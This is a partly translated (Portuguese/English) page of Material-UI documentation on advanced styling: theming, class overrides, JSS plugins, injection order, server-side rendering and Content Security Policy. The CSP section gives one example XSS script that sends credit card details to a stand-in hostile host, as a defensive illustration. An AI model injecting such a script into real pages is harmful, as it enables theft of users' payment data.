# Avançado

<p class="description">This section covers more advanced usage of @material-ui/core/styles.</p>

## Temas

Add a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Então, você pode acessar o objeto de tema em funções de estilo.

> This example creates a new theme. See the [theming section](/customization/theming/) for how to customize the default Material-UI theme.

```jsx
import { ThemeProvider } from '@material-ui/core/styles';
import DeepChild from './my_components/DeepChild';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### Acessando o tema em um componente

Você pode precisar acessar as variáveis de tema dentro de seus componentes React.

#### `useTheme` hook

For use in function components:

```jsx
import { useTheme } from '@material-ui/core/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

For use in class or function components:

```jsx
import { withTheme } from '@material-ui/core/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### Aninhamento de tema

Você pode aninhar vários provedores de tema. Isso pode ser muito útil ao lidar com diferentes áreas da sua aplicação que têm aparência distinta entre si.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

O tema interno **sobrescreverá** o tema exterior. Você pode estender o tema externo fornecendo uma função:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## Sobrescrevendo estilos - Propriedade `classes`

O `makeStyles` (hook generator) e `withStyles` (HOC) APIs permitem a criação de várias regras de estilos por folha de estilo. Cada regra de estilo tem seu próprio nome de classe. Os nomes das classes são fornecidos para o componente com a variável `classes`. Isso é particularmente útil ao estilizar elementos aninhados em um componente.

```jsx
// Uma folha de estilo
const useStyles = makeStyles({
  root: {}, // uma regra de estilo
  label: {}, // uma regra de estilo aninhada
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

No entanto, os nomes das classes geralmente não são determinísticos. Como um componente pai pode substituir o estilo de um elemento aninhado?

### `withStyles`

Este é o caso mais simples. O componente encapsulado aceita a propriedade `classes`, ele simplesmente mescla os nomes de classes fornecidos com a folha de estilo.

```jsx
const Nested = withStyles({
  root: {}, // uma regra de estilo
  label: {}, // uma regra de estilo aninhada
})(({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      Aninhado
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### `makeStyles`

A API hook requer um pouco mais de trabalho. Você tem que encaminhar as propriedades do pai para o hook como primeiro argumento.

```jsx
const useStyles = makeStyles({
  root: {}, // uma regra de estilo
  label: {}, // uma regra de estilo aninhada
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## Plugins JSS

JSS usa plugins para estender sua essência, permitindo que você escolha os recursos que você precisa, e somente pague pela sobrecarga de desempenho para o que você está usando.

Nem todos os plugins estão disponíveis por padrão no Material-UI. O seguinte (que é um subconjunto de [jss-preset-default](https://cssinjs.org/jss-preset-default/)) estão incluídos:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

Claro, você é livre para usar plugins adicionais. Aqui está um exemplo com o plugin [jss-rtl](https://github.com/alitaheri/jss-rtl).

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

export default function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}
```

## String templates

Se você preferir a sintaxe CSS sobre o JSS, você pode usar o plugin [jss-plugin-template ](https://cssinjs.org/jss-plugin-template/).

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Note que isto não suporta seletores, ou regras aninhadas.

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## Ordem de injeção de CSS

> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)

Por padrão, os estilos são inseridos **por último** no elemento `<head>` da sua página. Eles ganham mais especificidade do que qualquer outra folha de estilo em sua página, por exemplo, módulos CSS, componentes estilizados (styled components).

### injectFirst

O componente `StylesProvider` tem uma propriedade `injectFirst` para injetar as tags de estilo em **primeiro** no cabeçalho (menor prioridade):

```jsx
import { StylesProvider } from '@material-ui/core/styles';

<StylesProvider injectFirst>
  {/* Your component tree.
      Componentes com estilo podem sobrescrever os estilos de Material-UI. */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

A injeção de tags de estilo acontece na **mesma ordem** com as invocações de `makeStyles` / `withStyles` / `styled`. Por exemplo, a cor vermelha ganha maior especificidade neste caso:

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/core/styles';

const useStylesBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyles = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Order doesn't matter
  const classes = useStyles();
  const classesBase = useStylesBase();

  // Order doesn't matter
  const className = clsx(classes.root, classesBase.root)

  // color: red 🔴 wins.
  return <div className={className} />;
}
```

A ordem de chamada do hook e a ordem de concatenação da classe **não importam**.

### Ponto de inserção (insertionPoint)

JSS [fornece um mecanismo](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) para controlar esta situação. Adicionando um `ponto de inserção` dentro do HTML, você pode [ controlar a ordem](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) que as regras CSS são aplicadas aos seus componentes.

#### Comentário HTML

A abordagem mais simples é adicionar um comentário HTML no `<head>` que determina onde o JSS vai injetar os estilos:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

#### Other HTML elements

[Create React App](https://github.com/facebook/create-react-app) remove comentários em HTML ao criar a compilação de produção. Para contornar esse comportamento, você pode fornecer um elemento DOM (diferente de um comentário) como o ponto de inserção do JSS, por exemplo, um elemento `<noscript>`:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

#### JS createComment

codesandbox.io impede o acesso ao elemento `<head>`. Para contornar esse comportamento, você pode usar a API JavaScript `documento.createComment()`:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

## Renderização no servidor (Server-Side Rendering)

Este exemplo retorna uma string de HTML e insere o CSS crítico necessário, logo antes de ser usado:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/core/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).

### Gatsby

There is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Consulte a página do plugin para obter instruções de configuração e uso.

Refer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.

### Next.js

Você precisa ter um `pages/_document.js` customizado, então copie [esta lógica](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) para injetar os estilos renderizados no lado do servidor no elemento `<head>`.

Para um exemplo de uso atualizado, consulte [este projeto de exemplo](https://github.com/mui-org/material-ui/blob/master/examples/nextjs).

## Nomes de classes (Class names)

Os nomes de classes são gerados pelo [gerador de nome de classe](/styles/api/#creategenerateclassname-options-class-name-generator).

### Padrão

By default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Vejamos a seguinte estilo como um exemplo:

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

Isto irá gerar um nome de classe como `makeStyles-root-123`.

Você tem que usar a propriedade `classes` de um componente para sobrescrever os estilos. A comportamento não determinístico dos nomes de classes permitem o isolamento de estilos.

- Em **desenvolvimento**, o nome da classe é: `.makeStyles-root-123` seguindo esta lógica:

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- Em **produção**, o nome da classe é: `.jss123 ` seguindo esta lógica:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### Com `@material-ui/core`

Os nomes de classe gerados dos componentes `@material-ui/core ` se comportam de maneira diferente. Quando as seguintes condições são atendidas, os nomes das classes são **determinísticos**:

- Apenas um provedor de tema é usado (**Sem aninhamento de tema **)
- A folha de estilo tem um nome que começa com `Mui` (todos os componentes de Material-UI).
- A opção `disableGlobal` do [gerador de nome de clasee](/styles/api/#creategenerateclassname-options-class-name-generator) é `false` (o padrão).

Essas condições são atendidas com a forma de uso mais comum de `@material-ui/core`. Por exemplo, esta folha de estilo:

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

gera os seguintes nomes de classe que você pode sobrescrever:

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*Esta é uma simplificação da folha de estilo do componente `@material-ui/core/Button`.*

A customização de campos de texto pode ser incômoda com a [API `classes`](#overriding-styles-classes-prop), onde você tem que definir a propriedade classes. É mais fácil usar os valores padrão, conforme descrito acima. Por exemplo:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; 💔
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## Global CSS

### `jss-plugin-global`

O plugin [`jss-plugin-global`](#jss-plugins) é instalado na predefinição padrão. Você pode usá-lo para definir nomes de classes globais.

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### Híbrido

Você também pode combinar nomes de classe gerados pelo JSS com nomes globais.

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## Prefixos CSS

O JSS usa recursos de detecção para aplicar os prefixos corretos. [Não fique surpreso](https://github.com/mui-org/material-ui/issues/9293) se você não conseguir ver um prefixo específico na versão mais recente do Chrome. Seu navegador provavelmente não precisa disso.

## Política de segurança de conteúdo (CSP)

### O que é CSP e por que é útil?

Basicamente, o CSP reduz os ataques de cross-site scripting (XSS) exigindo que os desenvolvedores incluam na whitelist as fontes de onde seus assets são recuperados. Esta lista é retornada como um cabeçalho do servidor. Por exemplo, digamos que você tenha um site hospedado em `https://example.com` o cabeçalho CSP `default-src: 'self';` permitirá todos os assets localizados em `https://example.com/*` e negar todos os outros. Se houver uma seção do seu site que é vulnerável ao XSS, onde a entrada do usuário de unescaped é exibida, um invasor pode inserir algo como:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Esta vulnerabilidade permitiria que o invasor executasse qualquer coisa. No entanto, com um cabeçalho CSP seguro, o navegador não carregará esse script.

Você pode ler mais sobre o CSP no [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Como se implementa o CSP?

Para usar o CSP com Material-UI (e JSS), você precisa usar um nonce. Um nonce é uma string gerada aleatoriamente que é usada apenas uma vez, portanto, você precisa adicionar um middleware de servidor para gerar um em cada solicitação. JSS tem um [ótimo tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) sobre como conseguir isso com Express and React Helmet. Para um resumo básico, continue lendo.

Um nonce CSP é uma string codificada na Base 64. Você pode gerar um assim:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

É muito importante que você use o UUID versão 4, pois ele gera uma string **imprevisível**. Em seguida, você aplica esse nonce ao cabeçalho do CSP. Um cabeçalho CSP pode ser assim com o nonce aplicado:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Se você estiver usando renderização do lado do servidor(Server-Side Rendering), deverá passar o nonce na tag `<style>` no servidor.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
/>
```

Então, você deve passar este nonce para o JSS para que ele possa adicioná-lo às tags `<style>` subsequentes.

The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.

Você deve incluir esse cabeçalho independentemente de o SSR ser usado ou não. Here is an example of what a fictional header could look like:

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```